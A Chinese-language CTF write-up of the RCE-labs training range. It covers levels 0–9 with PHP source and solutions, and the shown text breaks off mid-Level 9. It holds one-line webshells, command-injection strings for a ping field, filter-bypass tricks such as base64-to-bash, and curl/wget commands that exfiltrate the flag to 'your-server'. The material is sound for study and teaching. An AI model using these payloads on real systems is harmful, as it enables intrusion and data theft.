---
title: RCE-labs Writeup
date: 2026-06-13 00:00:00
categories:
  - WP
tags:
  - RCE
---
{% raw %}
# RCE-labs 靶场 — 详细学习笔记

> 靶场：[RCE-labs](https://github.com/ProbiusOfficial/RCE-labs) | hello-ctf.com 基础靶场计划
> 共 28 个关卡 (Level 0 ~ Level 27)，系统覆盖命令执行、代码执行、各类 RCE 绕过技巧与 PHP 特性利用

---

## 目录

- [Level 0: 代码执行 & 命令执行基础](#level-0)
- [Level 1: 一句话木马和代码执行](#level-1)
- [Level 2: PHP 代码执行函数](#level-2)
- [Level 3: 命令执行](#level-3)
- [Level 4: Shell 运算符](#level-4)
- [Level 5: 黑名单式过滤](#level-5)
- [Level 6: 通配符匹配绕过](#level-6)
- [Level 7: 空格过滤](#level-7)
- [Level 8: 文件描述符和重定向](#level-8)
- [Level 9: 无字母命令执行_八进制转义](#level-9)
- [Level 10: 无字母命令执行_二进制整数替换](#level-10)
- [Level 11: 数字1的特殊变量替换](#level-11)
- [Level 12: 数字0的特殊变量替换](#level-12)
- [Level 13: 特殊扩展替换任意数字](#level-13)
- [Level 14: 7字符长度限制 RCE](#level-14)
- [Level 15: 5字符长度限制 RCE](#level-15)
- [Level 16: 4字符长度限制 RCE](#level-16)
- [Level 17: PHP 命令执行函数](#level-17)
- [Level 18: 环境变量注入](#level-18)
- [Level 19: 文件写入导致的 RCE](#level-19)
- [Level 20: 文件上传导致的 RCE](#level-20)
- [Level 21: 文件包含导致的 RCE](#level-21)
- [Level 22: PHP 动态调用](#level-22)
- [Level 23: PHP 自增构造](#level-23)
- [Level 24: 无参命令执行](#level-24)
- [Level 25: 取反绕过](#level-25)
- [Level 26: 无字母数字的代码执行](#level-26)
- [Level 27: 模板注入 (Smarty SSTI)](#level-27)
- [附录: 速查表汇总](#附录)

---

## <a id="level-0"></a>Level 0 — 代码执行 & 命令执行

### 源码

```php
// index.php
<?php
include ("get_flag.php");

$code = "include('flag.php');echo 'This will get the flag by eval PHP code: '.\$flag;";
$bash = "echo 'This will get the flag by Linux bash command - cat /flag: ';cat /flag";

eval($code);        // 代码执行
echo "<br>";
system($bash);      // 命令执行
highlight_file(__FILE__);
?>
```

```php
// get_flag.php
<?php
$file_path = "/flag";
if (file_exists($file_path)) {
    $flag = file_get_contents($file_path);
} else {
    $flag = "HelloCTF{Default_Flag}";
}
$flag_php = "<?php \$flag = \"$flag\"; ?>";
file_put_contents("flag.php", $flag_php);
?>
```

### 核心概念

这是整个靶场的基础概念关，打开页面即可看到 flag。重点在于理解三个核心术语的区别：

| 术语 | 全称 | 含义 |
|------|------|------|
| **ACE** | Arbitrary Code Execution | 攻击者在目标机器上运行任意代码/命令的能力的总称 |
| **RCE** | Remote Code Execution | 通过网络远程触发的 ACE |
| **命令执行** | Command Execution | 在 OS 层面执行系统指令（如 `cat /flag`） |
| **代码执行** | Code Execution | 执行该语言的任意代码（如 `eval("echo $flag;")`） |

**关键结论：** 代码执行 > 命令执行。代码执行能调用命令执行函数（如 `eval("system('cat /etc/passwd')")`），反之则不行。

### 详解

**1. `eval($code)` —— PHP 代码执行**

`eval()` 是 PHP 中最直接的代码执行函数。它把传入的字符串当作 PHP 代码来解析执行。在这里，变量 `$code` 的值是：
```php
"include('flag.php');echo 'This will get the flag by eval PHP code: '.\$flag;"
```
PHP 解析这个字符串时会：
1. `include('flag.php')` 引入 flag 文件，该文件由 `get_flag.php` 生成，定义了 `$flag` 变量
2. `echo ... \$flag` 输出 flag 的值（注意字符串中的 `\$flag` 被转义，在 `eval()` 执行时会解析为变量 `$flag`）

**2. `system($bash)` —— PHP 命令执行**

`system()` 将字符串传给系统的 shell 执行。这里的 `$bash` 值经过 shell 解析：
- `echo '...'` 和 `cat /flag` 都由 `/bin/sh` 执行
- 两个命令在同一个字符串中，shell 按分隔符自动拆分执行

**3. `get_flag.php` 的工作机制**

`get_flag.php` 从 `/flag` 文件（由 Docker 启动脚本在容器启动时写入）读取 flag，然后动态生成一个 `flag.php` 文件：
```php
<?php $flag = "实际flag值"; ?>
```
这样后续所有关卡都可以通过 `include('flag.php')` 或 `include('get_flag.php')` 来获取 flag 变量。

---

## <a id="level-1"></a>Level 1 — 一句话木马和代码执行

### 源码

```php
// index.php
<?php
include ("get_flag.php");

/*
「代码执行(Code Execution)」在某个语言中，通过一些方式(通常为函数或者方法调用)执行该语言的任意代码的行为。
当漏洞入口点可以执行任意代码时，我们称其为代码执行漏洞 —— 这种漏洞包含了通过语言中对接系统命令的函数来执行系统命令的情况。
*/

eval($_POST['a']);   // 一句话木马，通过 POST 参数 a 传入要执行的代码

highlight_file(__FILE__);
?>
```

### 解题方法

**方法一：直接输出 flag 变量**

因为 `get_flag.php` 已被 include，`$flag` 变量已存在于当前作用域中：

```
POST: a=echo $flag;
```

**方法二：读取 /flag 文件**

```
POST: a=system('cat /flag');
```

**方法三：Webshell 管理工具**

使用蚁剑/冰蝎/哥斯拉等工具连接，密码为 `a`：
- 连接地址：`http://target/`
- 连接密码：`a`

### 详解

这是最经典的一句话木马形式：`<?php @eval($_POST['password']); ?>`

- `$_POST['a']` 从 HTTP POST 请求中读取参数 `a`
- `eval()` 直接执行传入的 PHP 代码
- 因为 `get_flag.php` 中的 `include('flag.php')` 使得 `$flag` 变量在当前作用域可用，直接 `echo $flag` 即可
- 为什么用 POST 而非 GET？POST 可以传输更长的 payload，且不会被服务器日志默认记录 URL 参数

---

## <a id="level-2"></a>Level 2 — PHP 代码执行函数

### 源码

```php
// index.php
<?php
include ("get_flag.php");
global $flag;

session_start();

function hello_ctf($function, $content){
    global $flag;
    $code = $function . "(" . $content . ");";
    echo "Your Code: $code <br>";
    eval($code);                             // 最终执行
}

function get_fun(){
    $func_list = ['eval','assert','call_user_func','create_function',
                  'array_map','call_user_func_array','usort',
                  'array_filter','array_reduce','preg_replace'];

    if (!isset($_SESSION['random_func'])) {
        $_SESSION['random_func'] = $func_list[array_rand($func_list)];
    }
    $random_func = $_SESSION['random_func'];
    echo "获得新的函数: $random_func<br>";
    return $_SESSION['random_func'];
}

function start($act){
    $random_func = get_fun();

    if($act == "r"){                // GET: ?action=r 重置 session 换函数
        session_unset();
        session_destroy();
    }

    if ($act == "submit"){          // POST: content=...
        $user_content = $_POST['content'];
        hello_ctf($random_func, $user_content);
    }
}

isset($_GET['action']) ? start($_GET['action']) : '';
highlight_file(__FILE__);
?>
```

### 组装机制

`hello_ctf()` 的核心逻辑只有一行拼装：

```php
$code = $function . "(" . $content . ");";
eval($code);
```

用户的 `content` 被原封不动地插入到 `函数名(` 和 `);` 之间，然后整个语句被 `eval()` 执行。因此提交的 content 必须是合法的 PHP 函数参数。

**示例：** 抽到 `call_user_func`，content 提交 `'print_r',$flag`
→ 拼装为 `call_user_func('print_r',$flag);`
→ `eval("call_user_func('print_r',$flag);")` → 调用 `print_r($flag)` 输出 flag

**重要特性 — PHP 参数求值顺序：** PHP 在调用函数之前会**从左到右**依次计算每个参数的值。这意味着即使某函数（如 `usort`、`array_filter`）的"正经"用法不会输出 flag，但只要把 `print_r($flag)` 放在参数列表中，`print_r` 就会在函数被调用之前执行，flag 就会作为"副作用"被输出。

**操作流程：**
1. 访问 `?action=` 获取一个随机抽到的函数
2. 根据下面的函数对照表选择对应的 content 值
3. POST 提交到 `?action=submit`，参数名 `content=<payload>`
4. 如果对抽到的函数不满意，访问 `?action=r` 清空 session 重新抽

---

### 各函数解题方法详解

---

#### ① eval — 直接执行 PHP 代码

`eval()` 将字符串作为 PHP 代码执行，是最直接的代码执行函数。

**Payload：**
```
content = 'echo $flag;'
```

**拼装后实际执行的代码：**
```php
eval('echo $flag;');
```

eval 将 `echo $flag;` 作为 PHP 代码执行，由于 `hello_ctf()` 函数中声明了 `global $flag`，`$flag` 在当前作用域中可用。

**其他可用 payload：**
```
'var_dump($flag);'        # 打印变量类型和值
'print_r($flag);'         # 打印变量
'system("cat /flag");'    # 直接执行系统命令读 /flag 文件
```

---

#### ② assert — 断言执行（PHP < 8.0）

PHP 8.0 之前，`assert()` 如果传入字符串，会将该字符串作为 PHP 代码通过 `eval()` 执行。

**Payload：**
```
content = 'echo $flag;'
```

**拼装后实际执行的代码：**
```php
assert('echo $flag;');
```

assert 将字符串 `'echo $flag;'` 传给内部 eval 执行。

> **注意：** `assert(print_r($flag))` 也可以工作，此时 `print_r($flag)` 先执行并输出 flag，返回 true，然后 assert 校验 true 通过。但这是副作用方式，不如直接传字符串清晰。

---

#### ③ call_user_func — 回调函数调用

`call_user_func(callback, ...args)` 调用第一个参数指定的回调函数，后续参数传给该回调。

**Payload：**
```
content = 'print_r',$flag
```

**拼装后实际执行的代码：**
```php
call_user_func('print_r',$flag);
```

执行流程：
1. `call_user_func` 收到两个参数：回调名 `'print_r'` 和参数值 `$flag`
2. 底层调用 `print_r($flag)`
3. `print_r` 输出 `$flag` 的值到响应页面

**其他可用 payload：**
```
'var_dump',$flag           # var_dump($flag) 输出类型和值
'printf','%s',$flag        # printf('%s',$flag) 格式化输出
'assert',$flag             # assert($flag) 如果 $flag 是字符串
```

---

#### ④ create_function — 创建匿名函数并立即调用（PHP < 7.2）

`create_function(args, body)` 根据两个字符串参数创建一个匿名函数，**返回该函数的引用但不自动调用**。要输出 flag，必须创建后立即调用它。

**Payload：**
```
content = '$f','echo $f;')($flag
```

**拼装后实际执行的代码：**
```php
create_function('$f','echo $f;')($flag);
```

执行流程：
1. `create_function('$f', 'echo $f;')` — 创建一个匿名函数 `function($f) { echo $f; }`
2. `($flag)` — 立即调用该匿名函数，传入 `$flag` 作为参数
3. 匿名函数内 `echo $f;` 输出 flag 的值

**为什么不能直接写 `'$a','echo $flag;'`：**
- `create_function('$a','echo $flag;')` 只创建了函数，没有调用它
- 需要自己追加 `($flag)` 来调用。因为用户 content 后会自动补 `);`，所以在 content 中提前关闭 `)` 并追加调用 `($flag`

> **注意：** `$flag` 在 eval 作用域中可用（global $flag），它在被传给匿名函数之前已被 PHP 解析为实际值。

---

#### ⑤ array_map — 对数组每个元素调用回调

`array_map(callback, array)` 将回调函数应用于数组的每个元素，返回新数组。

**Payload（推荐 — 直接回调）：**
```
content = 'print_r',[$flag]
```

**拼装后实际执行的代码：**
```php
array_map('print_r',[$flag]);
```

执行流程：
1. `[$flag]` 创建一个包含 flag 值的单元素数组
2. `array_map` 对数组中唯一的元素调用 `print_r`
3. `print_r($flag)` 输出 flag

**Payload（副作用方式 — 利用参数求值顺序）：**
```
content = $a,print_r($flag)
```

**拼装后实际执行的代码：**
```php
array_map($a,print_r($flag));
```

执行流程：
1. PHP 先计算参数：`print_r($flag)` 执行并输出 flag（这是副作用），返回 true
2. `array_map($a, true)` 执行——虽然 true 不是有效回调会导致警告，但 flag 已经输出了

**其他可用 payload：**
```
'var_dump',[$flag]       # var_dump($flag) 更详细地输出
'assert',[$flag]         # assert($flag) 对每个元素执行断言
```

---

#### ⑥ call_user_func_array — 回调函数调用（数组参数版）

`call_user_func_array(callback, args_array)` 与 `call_user_func` 类似，但参数以数组形式传递。

**Payload（推荐 — 直接回调）：**
```
content = 'print_r',[$flag]
```

**拼装后实际执行的代码：**
```php
call_user_func_array('print_r',[$flag]);
```

执行流程：
1. `call_user_func_array` 将数组 `[$flag]` 展开为参数
2. 底层调用 `print_r($flag)`
3. 输出 flag

**Payload（副作用方式 — 利用参数求值顺序）：**
```
content = print_r($flag),array()
```

**拼装后实际执行的代码：**
```php
call_user_func_array(print_r($flag),array());
```

`print_r($flag)` 先执行输出 flag，返回值 true 作为 callback 参数。虽然后续调用会因 true 不是合法回调而出错，但 flag 已被输出。

---

#### ⑦ usort — 自定义排序（副作用方式）

`usort(&$array, callback)` 用自定义比较函数对数组排序。要求**第一个参数为数组引用**，且回调仅在数组至少 2 个元素时被调用。

**Payload（副作用方式）：**
```
content = $a,print_r($flag)
```

**拼装后实际执行的代码：**
```php
usort($a,print_r($flag));
```

执行流程：
1. PHP 先计算参数值：`print_r($flag)` 执行并输出 flag（副作用），返回 true
2. `usort($a, true)` 正式执行——true 不是合法回调，会报 Warning
3. 但 flag 已经在第 1 步中被输出，不影响拿分

**为什么 usort 只能走副作用方式：**
- `usort` 的回调是用来比较数组元素大小的，不是用来输出数据的
- 即便传入合法的回调如 `usort([2,1], 'print_r')`，print_r 也只是被用来比较 2 和 1，其输出结果不可控
- 所以要利用 PHP 参数求值顺序，在 `usort` 实际执行前就让 `print_r` 把 flag 输出来

---

#### ⑧ array_filter — 数组过滤（副作用方式 / 回调方式均可）

`array_filter($array, $callback)` 用回调函数过滤数组元素。

**Payload（推荐 — 直接回调输出）：**
```
content = [$flag],'var_dump'
```

**拼装后实际执行的代码：**
```php
array_filter([$flag],'var_dump');
```

执行流程：
1. `[$flag]` 创建一个包含 flag 值的单元素数组
2. `array_filter` 对每个元素调用 `var_dump`——`var_dump($flag)` 输出 flag
3. `var_dump` 返回 null，array_filter 将其视为"不保留该元素"

**Payload（副作用方式）：**
```
content = $a,print_r($flag)
```

**拼装后实际执行的代码：**
```php
array_filter($a,print_r($flag));
```

`print_r($flag)` 先执行输出 flag，然后 `array_filter` 用返回值 true 作为回调（会因 true 不是合法回调而警告，但 flag 已输出）。

---

#### ⑨ array_reduce — 数组迭代归约（副作用方式 / 回调方式均可）

`array_reduce($array, $callback, $initial)` 用回调函数迭代地将数组归约为单一值。

**Payload（推荐 — 直接回调输出）：**
```
content = [$flag],'var_dump'
```

**拼装后实际执行的代码：**
```php
array_reduce([$flag],'var_dump');
```

执行流程：
1. `[$flag]` 创建一个包含 flag 值的单元素数组
2. `array_reduce` 调用 `var_dump(null, $flag)`，其中 null 是未传 initial 时的默认初始值
3. `var_dump` 会依次打印 null 和 $flag 的值

**Payload（副作用方式）：**
```
content = $a,print_r($flag)
```

**拼装后实际执行的代码：**
```php
array_reduce($a,print_r($flag));
```

同样利用参数求值顺序，`print_r($flag)` 先执行输出 flag。

---

#### ⑩ preg_replace — 正则替换（利用 /e 模式或副作用）

`preg_replace($pattern, $replacement, $subject)` 执行正则搜索替换。如果 pattern 带 `/e` 修饰符（PHP < 7.0），replacement 会被当作 PHP 代码执行。

**Payload（副作用方式 — 适用于所有 PHP 版本）：**
```
content = '/./','',${print_r($flag)}
```

**拼装后实际执行的代码：**
```php
preg_replace('/./','',${print_r($flag)});
```

执行流程：
1. PHP 先计算参数：`${print_r($flag)}` 中的 `print_r($flag)` 先执行并输出 flag（副作用）
2. `print_r` 返回 true（自动转为字符串 "1"）
3. `${"1"}` 尝试访问名为 "1" 的变量，触发 Notice 但无关紧要
4. `preg_replace('/./', '', "<变量1的值>")` 执行完毕（但 flag 已在第 1 步输出）

**Payload（/e 模式 — 仅 PHP < 7.0 有效）：**
```
content = '/./e','echo $flag;','a'
```

**拼装后实际执行的代码：**
```php
preg_replace('/./e','echo $flag;','a');
```

- 正则 `/./e` 匹配任意单个字符，`/e` 修饰符使 replacement 作为 PHP 代码执行
- 匹配到 `a` 后，`'echo $flag;'` 被 eval 执行，输出 flag

> **注意：** `/e` 修饰符在 PHP 5.5 废弃、PHP 7.0 移除。本靶场使用 PHP 7.3，因此 /e 方式不可用，应使用副作用方式。

---

### 快速参考表

| 函数 | POST `content` | 拼装后实际执行 | 方式 |
|------|---------------|---------------|------|
| `eval` | `'echo $flag;'` | `eval('echo $flag;');` | 直接代码执行 |
| `assert` | `'echo $flag;'` | `assert('echo $flag;');` | 字符串转 eval (PHP<8.0) |
| `call_user_func` | `'print_r',$flag` | `call_user_func('print_r',$flag);` | 回调调用 print_r($flag) |
| `create_function` | `'$f','echo $f;')($flag` | `create_function('$f','echo $f;')($flag);` | 创建匿名函数 → 立即调用 |
| `array_map` | `'print_r',[$flag]` | `array_map('print_r',[$flag]);` | 回调作用于数组元素 |
| `call_user_func_array` | `'print_r',[$flag]` | `call_user_func_array('print_r',[$flag]);` | 回调调用（数组传参） |
| `usort` | `$a,print_r($flag)` | `usort($a,print_r($flag));` | 参数求值副作用输出 |
| `array_filter` | `[$flag],'var_dump'` | `array_filter([$flag],'var_dump');` | 回调作用于数组元素 |
| `array_reduce` | `[$flag],'var_dump'` | `array_reduce([$flag],'var_dump');` | 回调作用于数组元素 |
| `preg_replace` | `'/./','',${print_r($flag)}` | `preg_replace('/./','',${print_r($flag)});` | 参数求值副作用输出 |

### 关键知识点总结

1. **组装机制：** `hello_ctf()` 将用户输入拼成 `函数(content);` 后 eval 执行
2. **副作用输出：** PHP 从左到右计算函数参数，即使函数本身不支持输出，只要把 `print_r($flag)` 放进参数列表就能抢在函数执行前输出 flag
3. **create_function 特殊处理：** 该函数只创建函数不调用，需要在 content 中提前关闭 `)` 并追加调用 `($flag)`
4. **换函数：** `?action=r` 重置 session，重新随机抽取函数
5. **版本注意：** `create_function()` PHP 7.2 废弃/8.0 移除；`preg_replace /e` PHP 7.0 移除；此靶场使用 PHP 7.3

---

## <a id="level-3"></a>Level 3 — 命令执行

### 源码

```php
// index.php
<?php
/*
「命令执行(Command Execution)」通常指的是在操作系统层面上执行预定义的指令或脚本。
当漏洞入口点只能执行系统命令时，我们称该漏洞为命令执行漏洞。
*/

system($_POST['a']);

highlight_file(__FILE__);
?>
```

### 解题方法

```
POST: a=cat /flag
```

与 Level 1 本质相同，只不过入口函数从 `eval()` 换成了 `system()`。

### 详解

`system()` 函数：
- 执行系统命令并**直接输出**结果到响应体
- 执行成功返回输出的最后一行，失败返回 false
- 底层通过 `/bin/sh -c "command"` 来执行，sh 通常是系统的默认 shell 软连接

---

## <a id="level-4"></a>Level 4 — Shell 运算符

### 源码

```php
// index.php
<?php

function hello_server($ip){
    system("ping -c 1 $ip");    // 直接将用户输入拼接到 shell 命令中
}

isset($_GET['ip']) ? hello_server($_GET['ip']) : null;
highlight_file(__FILE__);
?>
```

### 漏洞分析

用户输入的 `$ip` 被直接拼接到 `system()` 中执行：`ping -c 1 <用户输入>`

没有任何过滤或转义，类注入点。攻击者可以在 IP 后使用 Shell 运算符追加任意命令。

### 解题方法

```bash
# 方法1: && — 前命令成功才执行后续（ping 1.1.1.1 能通）
?ip=1.1.1.1&&cat /flag

# 方法2: || — 前命令失败才执行后续（ping x 因无法解析而失败）
?ip=||cat /flag

# 方法3: ; — 无论成败都执行
?ip=;cat /flag

# 方法4: & — 后台并行执行（需 URL 编码为 %26，因为 & 是 URL 参数分隔符）
?ip=%26cat /flag
```

### Shell 运算符详解

| 运算符 | 名称 | 执行条件 | 示例 |
|--------|------|----------|------|
| `&&` | 逻辑与 | cmd1 成功 (exit 0) 才执行 cmd2 | `cmd1 && cmd2` |
| `\|\|` | 逻辑或 | cmd1 失败 (exit != 0) 才执行 cmd2 | `cmd1 \|\| cmd2` |
| `\|` | 管道 | cmd1 的输出作为 cmd2 的输入 | `cmd1 \| cmd2` |
| `;` | 分隔符 | 无论 cmd1 是否成功都执行 cmd2 | `cmd1 ; cmd2` |
| `&` | 后台 | cmd1 放入后台，立即执行 cmd2 | `cmd1 & cmd2` |

**扩展 — 其他 Shell 特殊符号：**

| 符号 | 作用 | 示例 |
|------|------|------|
| `` ` `` | 命令替换（反引号） | ``echo `whoami` `` |
| `$()` | 命令替换（推荐） | `echo $(whoami)` |
| `>` | 重定向输出（覆盖） | `echo hi > file.txt` |
| `<` | 重定向输入 | `cat < file.txt` |
| `>>` | 重定向输出（追加） | `echo hi >> file.txt` |
| `\` | 转义字符 | `echo \$HOME` |

---

## <a id="level-5"></a>Level 5 — 黑名单式过滤

### 源码

```php
// index.php
<?php

function hello_shell($cmd){
    if(preg_match("/flag/", $cmd)){     // 黑名单：包含 "flag" 就拦截
        die("WAF!");
    }
    system($cmd);
}

isset($_GET['cmd']) ? hello_shell($_GET['cmd']) : null;
highlight_file(__FILE__);
?>
```

### 漏洞分析

只过滤了字符串 `flag`，没有递归过滤、不限制长度、不过滤其他字符。绕过它的核心理念是：**让 shell 看到的最终命令包含 `flag`，但传递给 PHP 的字符串本身不包含连续的 "flag" 四个字母。**

### 解题方法 & 详细解析

#### 方法一：空字符（引号）绕过

```bash
?cmd=cat /f''lag
?cmd=cat /f'l'ag
?cmd=cat /f"l"ag
```

**原理：** Shell 将 `''` 和 `""` 视为空字符串，在解析时直接忽略它们。`/f''lag` 经 shell 解析后仍然是 `/flag`，但 PHP 正则看到的是 `f''lag`，不匹配 `/flag/` 模式。

#### 方法二：通配符绕过

```bash
?cmd=cat /f*           # * 匹配零到多个字符，f* 可匹配 flag
?cmd=cat /???/?a?      # ? 匹配单个字符，精确匹配 /bin/cat 和 /flag 的路径
```

**Shell 通配符速查：**

| 通配符 | 含义 | 示例 |
|--------|------|------|
| `*` | 匹配零个或多个任意字符 | `/f*` 匹配 `/flag`, `/foo`, `/f` |
| `?` | 匹配恰好一个字符 | `/???g` 匹配 `/flag` |
| `[]` | 匹配括号内任意一个字符 | `/fla[g-z]` 匹配 `/flag` |
| `[^]` | 匹配不在括号内的任意字符 | `/fla[^a-f]` 匹配 `/flag` |
| `{}` | 匹配括号内任意一个字符串 | `/fl{ag,og}` 匹配 `/flag` 和 `/flog` |

#### 方法三：赋值与拼接

```bash
?cmd=a=c;b=at;c=fla;d=g;$a$b /$c$d
```

URL 编码后：
```
?cmd=a%3Dc%3Bb%3Dat%3Bc%3Dfla%3Bd%3Dg%3B%24a%24b%20%2F%24c%24d
```

**原理：** 在 shell 中用变量赋值存储各个字符片段，然后通过 `$变量名` 引用拼接。`a=c; b=at` → `$a$b` = `cat`，同理 `$c$d` = `flag`。

#### 方法四：反斜杠转义

```bash
?cmd=ca\t /fla\g
```

**原理：** Shell 中的 `\` 会转义下一个字符。`\t` 转义后仍然是 `t`，`\g` 转义后仍然是 `g`。PHP 的正则匹配看到的是 `ca\t /fla\g`，不包含连续的 `flag`。

#### 方法五：利用未定义的 Shell 变量

```bash
?cmd=ca$1t /fl$@ag
?cmd=ca$1t /fl$1ag
```

**原理：** Shell 特殊变量 `$1`, `$2`, ..., `$9` 代表脚本参数，在 `system()` 调用的 shell 中这些变量未定义，值为空字符串。`$@` 在无参数时也为空。

#### 方法六：编码/进制绕过

```bash
# Base64 编码
?cmd=cat "$(echo 'L2ZsYWc=' | base64 -d)"
?cmd=`echo "Y2F0IC9mbGFn"|base64 -d`
?cmd=echo "Y2F0IC9mbGFn"|base64 -d|bash

# 十六进制编码
?cmd=echo -n 636174202f666c6167 | xxd -r -p | bash

# 八进制转义（bash 特性）
?cmd=$(printf "\143\141\164\040\057\146\154\141\147")
```

**原理：**
- `echo 'L2ZsYWc=' | base64 -d` 将 base64 字符串解码为 `/flag`
- `echo "Y2F0IC9mbGFn" | base64 -d` 将 base64 字符串解码为 `cat /flag`
- `xxd -r -p` 将十六进制字符串还原为原始字节
- `printf "\143\141\164\040\057\146\154\141\147"` 将八进制序列转换为字符 `cat /flag`

---

## <a id="level-6"></a>Level 6 — 通配符匹配绕过

### 源码

```php
// index.php
<?php

function hello_shell($cmd){
    if(preg_match("/[b-zA-Z_@#%^&*:{}\-\+<>\"|`;\[\]]/", $cmd)){
        die("WAF!");                       // 过滤了字母 b-z, B-Z，但保留了 a 和数字
    }
    system($cmd);
}

isset($_GET['cmd']) ? hello_shell($_GET['cmd']) : null;
highlight_file(__FILE__);
?>
```

### 漏洞分析

关键点：正则 `[b-zA-Z_@#%^&*:{}\-\+<>\"|`;\[\]]` 过滤了大量字符，但**没有过滤数字 0-9、字母 a、`?`、`/`、`$`、`'`、空格**等。

这意味着我们可以用 `/???/?a?` 来匹配命令路径（如 `/bin/cat`）。

### 解题方法

通过 `?` 通配符匹配 `/bin/cat` 命令路径：

```bash
# 在 Linux 终端中可验证
$ echo /???/?a?
/bin/cat /bin/tar
# /???/?a? 可以匹配到 /bin/cat（因为 ? 匹配单个字符，a 精确匹配）

# payload: 用通配符路径执行 cat 读取 flag
?cmd=/???/?a? /??a?
# /???/?a? → 匹配 /bin/cat
# /??a? → 匹配 /flag

# 或者使用 base64 读 flag
?cmd=/???/?a??64 /??a?
# /???/?a??64 → 匹配 /bin/base64
# /??a? → 匹配 /flag
```

**为什么能这样匹配：**
- `/???/` 匹配包含恰好 3 个字符的目录，如 `/bin/`、`/etc/`
- `/bin/cat` = `/???/?a?`：`???` 匹配 `bin`，`?a?` 匹配 `cat`（`?`=c, `a`=a, `?`=t）

### 其他可读文件的 Linux 命令

| 命令 | 说明 |
|------|------|
| `cat` | 从第一行开始输出 |
| `tac` | 从最后一行倒序输出 |
| `more` / `less` | 分页显示 |
| `head` / `tail` | 显示头/尾几行 |
| `nl` | 带行号输出 |
| `sort` | 排序输出 |
| `od` | 以八进制/十六进制等格式输出 |
| `rev` | 反转每行字符顺序 |
| `uniq` | 过滤重复行 |
| `base64` | Base64 编码/解码 |
| `xxd` | 十六进制 dump |

---

## <a id="level-7"></a>Level 7 — 空格过滤

### 源码

```php
// index.php
<?php

function hello_shell($cmd){
    if(preg_match("/flag| /", $cmd)){    // 同时过滤 "flag" 和 空格
        die("WAF!");
    }
    system($cmd);
}

isset($_GET['cmd']) ? hello_shell($_GET['cmd']) : null;
highlight_file(__FILE__);
?>
```

### 解题方法

同时需要绕过 `flag` 关键词和空格。下面是将 Level 5 的空格绕过方法应用到本题：

#### 方法一：`$IFS` + 引号

```bash
?cmd=cat${IFS}/fl""ag
?cmd=cat$IFS/fl""ag
```

**原理：** `$IFS` (Internal Field Separator) 是 shell 的内部字段分隔符变量，默认值为空格、制表符(TAB)和换行符。用 `${IFS}` 或 `$IFS` 可替代空格作为命令分隔符。`${IFS}` 用花括号明确变量名边界。

#### 方法二：TAB 制表符 `%09`

```bash
?cmd=cat%09/fl""ag
```

**原理：** TAB (ASCII 0x09) 也是 `$IFS` 的默认分隔符之一。URL 编码为 `%09`。

#### 方法三：重定向 `<`

```bash
?cmd=cat</fl""ag
```

**原理：** `<` 将文件内容重定向到命令的标准输入。`cat < /flag` 等同于 `cat /flag`。

#### 方法四：花括号 `{}`（仅 bash）

```bash
?cmd={cat,/f'l'ag}
```

**原理：** Bash 的大括号扩展 `{a,b}` 会展开为两个独立的参数。`{cat,/flag}` 展开为 `cat /flag`。

#### 方法五：十六进制转义

```bash
?cmd=X=$'cat\x20/flag'&&$X
```

**原理：** `$'...'` 语法中 `\x20` 是空格的十六进制表示，赋值给变量 X 后执行 `$X`。

#### 方法六：斜杠 `/` 也被过滤时的绕过

```bash
# 使用 HOME 变量的第一个字符替代 /
?cmd=cat ${HOME:0:1}flag
# ${HOME} 通常是 /root 或 /home/user，取第一个字符就是 /

# 使用 tr 命令转换
?cmd=cat $(echo . | tr '!-0' '"-1')flag
# tr '!-0' '"-1' 将 . 字符映射为 /
```

---

## <a id="level-8"></a>Level 8 — 文件描述符和重定向

### 源码

```php
// index.php
<?php

function hello_shell($cmd){
    /* >/dev/null 将不会有任何回显，但会回显错误，加上 2>&1 后连错误也会被屏蔽掉 */
    system($cmd.">/dev/null 2>&1");   // 输出被重定向到 /dev/null，看不到结果
}

isset($_GET['cmd']) ? hello_shell($_GET['cmd']) : null;
highlight_file(__FILE__);
?>
```

### 漏洞分析

命令的输出被 `>/dev/null 2>&1` 重定向到 `/dev/null`（丢弃），**页面看不到任何回显**。但命令本身仍然会执行。这是一个**无回显命令执行**场景。

### 解题方法

#### 方法一：覆盖重定向

```bash
# 把我们想要看到的结果重定向到标准输出
?cmd=cat /flag 1>&0
# 或者把结果写入 web 可访问的文件
?cmd=cat /flag > /var/www/html/result.txt
# 然后访问 http://target/result.txt
```

#### 方法二：外带数据

```bash
# 使用 curl 或 wget 将 flag 发送到自己的服务器
?cmd=curl http://your-server/$(cat /flag|base64)
?cmd=wget http://your-server/$(cat /flag)
```

#### 方法三：利用错误输出

```bash
# 标准输出被屏蔽，但可以将结果重定向到标准错误输出
?cmd=cat /flag >&2
# 这会将 cat /flag 的输出重定向到 stderr (文件描述符 2)
# 注意原本的 2>&1 把 stderr 也屏蔽了，需要先覆盖
```

### Linux 文件描述符详解

| 描述符 | 名称 | 默认指向 |
|--------|------|----------|
| 0 | stdin | 键盘输入 |
| 1 | stdout | 终端屏幕输出 |
| 2 | stderr | 终端屏幕输出 |

**常用重定向操作：**

| 符号 | 含义 |
|------|------|
| `>` | 覆盖写入 (等同于 `1>`) |
| `<` | 读取 (等同于 `0<`) |
| `>>` | 追加写入 |
| `2>&1` | 将 stderr 合并到 stdout |
| `1>&2` | 将 stdout 合并到 stderr |
| `>&-` | 关闭标准输出 |
| `>/dev/null` | 丢弃输出 |

---

## <a id="level-9"></a>Level 9 — 无字母命令执行：八进制转义

### 源码

```php
// index.php
<?php

function hello_shell($cmd){
    if(preg_match("/[A-Za-z\"%*+,-.\/:;=>?@[\]^`|]/", $cmd)){
        die("WAF!");                     // 过滤了所有字母（大小写）
    }
    system($cmd);
}

isset($_GET['cmd']) ? hello_shell($_GET['cmd']) : null;
highlight_file(__FILE__);
?>
```

### Dockerfile 关键改动

```dockerfile
FROM php:7.3-fpm-alpine

RUN sed -i 's/dl-cdn.alpinelinux.org/mirrors.ustc.edu.cn/g' /etc/apk/repositories &&\
    apk add --update --no-cache nginx bash

# 关键：修改 sh 的软连接指向 bash
RUN ln -sf /bin/bash /bin/sh
```

### 漏洞分析

使用 PHP `system()` 函数时，底层调用的是 `/bin/sh -c "command"`。而 sh 通常是一个软连接：
- **Debian 系** → sh 指向 dash
- **CentOS 系** → sh 指向 bash
- **Alpine (本靶场镜像)** → sh 指向 busybox

本题的关键前置条件：Dockerfile 中 `RUN ln -sf /bin/bash /bin/sh` 将 sh 指向了 bash，因为八进制转义是 **bash 特性**，dash 和 busybox 都不支持。

同时注意可用字符集：数字 `0-9`、`$`、`'`、`\`、空格、`#`、`(`、`)`、`!`、`{`、`}`、`<`、`~`、`_`

### 解题方法

```bash
